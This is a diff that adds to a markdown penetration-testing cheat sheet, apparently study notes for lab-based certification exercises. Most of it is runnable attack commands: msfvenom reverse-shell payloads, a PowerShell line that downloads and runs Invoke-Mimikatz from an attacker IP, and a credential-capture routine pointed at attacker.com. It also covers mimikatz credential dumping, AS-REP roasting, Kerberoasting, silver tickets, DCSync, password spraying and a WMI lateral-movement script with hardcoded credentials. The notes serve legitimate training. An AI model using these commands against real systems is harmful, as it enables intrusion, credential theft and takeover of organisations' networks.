@@ -3,23 +3,18 @@
 **DNS Enumeration:**
 
 `host www.target.domain`
-
 `host -t txt,mx domain.com`
 
 `dnsrecon -d megacorpone.com -t std`
-
 `dnsrecon -d megacorpone.com -D list.txt -t brt`
-
 `dnsenum megacorpone.com`
 
 `nslookup mail2.megacorpone.com`
-
 `nslookup -type=TXT info.megacorpone.com 8.8.8.8`
 
 **TCP/UDP Port Scanning:**
 
 `nc -nvv -w 1 -z 10.0.0.74 1-1000`
-
 `nc -nv -u -z -w 1 10.0.0.74 1-1000`
 
 `for ip in $(seq 100 200); do nc -nv -z -w 1 -u 192.168.45.44 $ip; done`
@@ -27,13 +22,10 @@
 `sudo netdiscover -r 10.0.0.0/24`
 
 `sudo nmap -v -sn 192.168.44.0-253 -oG sweep.txt`
-
 `nmap --script-help http-headers`
-
 `sudo nmap -p 445 --script=smb-enum-users 192.168.44.30 -Pn`
 
 `sudo nmap -sV -sC -sU 192.168.44.30 -p 1-1000 -Pn | tee scan.txt`
-
 `sudo masscan -p1-65535,U1:65535 192.168.44.30 --rate=1000 -e tun0`
 
 `Test-NetConnection -Port 445 192.168.45.33`
@@ -42,9 +34,8 @@
 
 **no TTY shell:**
 
-```(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell```
-	
- - (am I running in cmd or PS?)
+(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell (am I running in cmd or PS?)
+	- am I running in PowerShell or cmd?
 
 `python -c 'import pty; pty.spawn("/bin/bash")'`
 
@@ -665,6 +656,7 @@ listen 192.168.244.7:9998 172.16.244.217:445
 1. `sudo msfdb init`
 2. `sudo systemctl enable postgresql`
 3. `sudo msfconsole`
+
 ```
 General Commands: 
 
@@ -676,6 +668,7 @@ hosts
 services
 services -p 21
 ```
+
 ```
 Auxiliary modules:
 
@@ -693,12 +686,14 @@ vulns
 creds
 jobs
 ```
+
 ```
 Exploit modules:
 
 Ctrl-Z                 (put a session in the background)
 sessions -k 12         (kill session 12)
 ```
+
 ```
 Meterpreter payloads:
 
@@ -713,6 +708,7 @@ lpwd, lcd, lcat           (commands prefixed with 'l' run on the attacker)
 download C:\\Users\\Alex\\Desktop\\proof.txt
 upload dnscat2.exe C:\\Users\\Alex\\Desktop\\runme.exe
 ```
+
 ```
 msfvenom:
 
@@ -720,6 +716,7 @@ msfvenom -l payloads --platform linux --arch x64
 msfvenom -l windows/x64/shell_reverse_tcp LHOST=192.168.45.204 LPORT=4444 -f exe -o binary.exe
 msfvenom -p php/reverse_php LHOST=192.168.45.204 LPORT=443 -o form.pHP -f raw
 ```
+
 ```
 Post-Exploitation:
 
@@ -736,6 +733,7 @@ load kiwi
 	- creds_msv
 	- creds_all
 ```
+
 ```
 Pivoting with Metasploit/Meterpreter:
 	- either manually declare routes or have autoroute establish them automatically; turn a session into a pivot point using the portfwd command; turn the current Metasploit instance into a SOCKS proxy (127.0.0.1:1080) using multi/manage/autoroute
@@ -757,6 +755,42 @@ auxiliary/server/socks_proxy
 portfwd add -l 9998 -p 445 -r 172.16.50.4
 	- forward 127.0.0.1:9998 to 172.16.50.4:445
 	- run -j
+```
+
+```
+Miscellaneous:
+
+multi/script/web_delivery           (generate one-liners and run their servers)
+
+impersonating tokens with Metasploit:
+1. getprivs
+2. load incognito
+3. list_tokens -u
+4. impersonate_token domain\\Administrator
+5. shell
+6. rev2self        (return to previous user before elevation if needed)
+
+post/multi/recon/local_exploit_suggester     (local Windows exploit suggester)
+
+exploit/windows/local/always_install_elevated    (exploit AlwaysInstallElevated)
+
+auxiliary/server/capture/http_basic
+1. requires GUI access
+2. set uripath testPath
+3. run
+4. on the victim:
+	1. browse to http://attacker.com/testPath
+	2. open the task manager
+	3. right click on the browser and "Create Dump File"
+	4. copy this dump to the attacker
+5. in attacker:
+	1. strings dump.dump | grep "Authorization: Basic"
+	2. copy the b64 encoded string
+	3. echo -ne b64EncodedString | base64 -d
+
+auxiliary/scanner/smb/smb_enum_gpp       
+	- (search for credentials with SMB access; gpp_decrypt in kali can decrypt)
+
 ```
 
 **Automating Metasploit:**
@@ -788,6 +822,8 @@ net user /domain
 net user john /domain
 net group /domain                   (net.exe does not show Domain Local groups)
 net group "Domain Admins" /domain
+
+impacket-GetADUsers corp.com/stephanie:"Password6" -all -dc-ip 192.168.180.70
 ```
 ```
 Using PowerView.ps1
@@ -824,5 +860,187 @@ Get-ObjectAcl -Identity "<group-or-user-name>" | ? {$_.ActiveDirectoryRights -eq
 	- display SID and rights per object
 
 "<SID>","<SID>","<SID>" | Convert-SidToName
+
+net group "Domain Admins" added_user /add /domain
+
+net group "Domain Admins" added_user /del /domain
+
+Find-DomainShare           (-CheckShareAccess shows only accessible shares)
+	- %SystemRoot%\SYSVOL\Sysvol\domain-name
+
+ls \\DC01.corp.com\sysvol\corp.com\
+```
+
+```
+Automated Active Directory Enumeration:
+
+1. Ingestion with SharpHound.ps1
+
+- Import-Module .\SharpHound.ps1
+
+- Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\temp\ -OutputPrefix "victim"
+
+- .\SharpHound.ps1 --CollectionMethod All --Loop --LoopDuration 01:15:00 --LoopInterval 00:10:00 -OutputDirectory C:\temp\ -OutputPrefix "victim"
+
+2. Analysis with BloodHoundAD
+
+sudo neo4j start
+	- neo4j : neo4j1
+bloodhound
+	- database info > clear database
+	- upload data > zip file here
+	- look for:
+		- outbound object control for all owned assets
+		- short paths to X
+		- kerberoastable users
+	- raw queries:
+		- MATCH (m:Computer) RETURN m
+		- MATCH (m:User) RETURN m
+		- MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
+```
+
+```
+Enumerating Active Directory with Credentials:
+
+net accounts /domain               (grab the lockout policy in effect)
+
+crackmapexec smb 192.168.55.44 -u users.txt -p test123 -d domain.local --continue-on-success
+crackmapexec smb 192.168.45.44 -u "" -p ""
+crackmapexec smb 192.168.45.44 -u Administrator -p Password1# --local-auth
+crackmapexec smb 192.168.45.0/24 -u Administrator -H LM:NT --local-auth
+crackmapexec smb 192.168.45.0/24 -u Administrator -H NT
+https://cheatsheet.haax.fr/windows-systems/exploitation/crackmapexec/
+
+.\CheckCredentials.ps1            (add the credentials in the source code)
+.\Spray-Passwords.ps1 -Pass Password1#       (spray passwords via LDAP)
+.\Spray-Passwords.ps1 -Pass Password1# -Admins
+
+.\kerbrute passwordspray -d domain.local usernames.lst "Password1#"
+	- usernames.lst has to be ANSI encoded (Notepad > Save As)
+```
+
+```
+Exploiting Active Directory Authentication
+**NTLM is used when servers are addressed via IP or unregistered hostname
+**Kerberos is used when servers are addressed via registered hostname
+
+IEX(New-Object Net.Webclient).downloadstring("http://<attacker-IP/Invoke-Mimikatz.ps1>")
+
+.\mimikatz.exe
+	- privilege::debug
+	- sekurlsa::logonpasswords
+	- sekurlsa::tickets
+	- crpyto::capi or crypto::cng      (patch functions to export private keys)
+
+1. AS-REP Roasting:         (accounts w/ no Kerberos pre-authentication)
+
+Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
+	- use GenericAll/GenericWrite to disable Kerberos pre-authentication
+From Linux:
+
+impacket-GetNPUsers corp.com/ -dc-ip 192.168.180.70 -format hashcat -usersfile users.txt              (check for asrep roastable users)
+
+impacket-GetNPUsers corp.com/dave -dc-ip 192.168.180.70 -format hashcat >> hash.test              (grab dave's password hash)
+
+sudo hashcat -m 18200 hashes.asrep /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force      (crack the hash)
+
+From Windows:
+
+. .\PowerView.ps1; Get-DomainUser -PreauthNotRequired | select cn
+
+.\Rubeus.exe asreproast /nowrap
+
+sudo hashcat -m 18200 hashes.asrep /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+
+
+2. Kerberoasting:          (attacking user accounts associated with an SPN)
+
+Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/UnIqUeVaLuE123'} -verbose
+
+	- use GenericAll/GenericWrite to give an account an SPN and make them kerberoastable
+
+From Windows:
+
+.\Rubeus.exe kerberoast /outfile:hashes.kerber
+
+sudo hashcat -m 13100 hashes.kerber /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+
+From Linux:
+
+sudo impacket-GetUserSPNs -request -dc-ip <DC-IP> domain.local/<valid-username>:"Password1"
+
+sudo hashcat -m 13100 hashes.kerber /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+
+
+3. Silver Tickets:             (service account password/hash and SPN)
+
+From Windows:
+
+.\mimikatz.exe
+privilege::debug
+sekurlsa::logonpasswords
+
+whoami /user
+
+- domain SID = user SID - RID (last 4 digits)
+
+kerberos::golden /sid:<SID> /domain:domain.local /ptt /target:hostname.domain.local /service:http /rc4:<SPN's-NTLM-hash> /user:<victim-domain-admin-user>
+
+misc::cmd
+
+klist
+
+- list tickets cached in memory
+
+iwr -UseDefaultCredentials http://web04.corp.com -OutFile test.html
+
+- accessing a web server with a cached ticket
+
+
+4. DCSync:                  (local Admin on a domain joined machine)
+
+From Windows:
+
+.\mimikatz.exe
+lsadump::dcsync /user:domain.local\<target-user>
+
+- dump <target-user>'s NTLM hash from the domain controller
+- lsadump::dcsync /user:domain\Administrator
+
+From Linux:
+
+impacket-secretsdump -just-dc-user <target-user> domain.local/<compromised-admin>:"Password1"@<DC-IP>
+
+hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+
+```
+
+```
+Lateral Movement in Active Directory:
+
+1. WMI:
+
+wmic /node:<target-IP> /user:<domain-user> /password:<password> process call create "notepad.exe"
+
+executing arbitrary commands on a domain joined target:
+
+```
+```# this is a basic script demonstrating AD lateral movement via WMI
+
+# creating the PSCredential object
+$username = 'jen'
+$password = 'Nexus123!'
+$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
+$credential = New-Object System.Management.Automation.PSCredential $username,$secureString;
+
+$Options = New-CimSessionOption -Protocol DCOM
+$session = New-CimSession -ComputerName 192.168.180.72 -Credential $credential -SessionOption $Options
+$Command = 'type C:\\Users\\Administrator\\Desktop\\flag.txt';
+
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command}```
+
+
+
+```
 
 ```
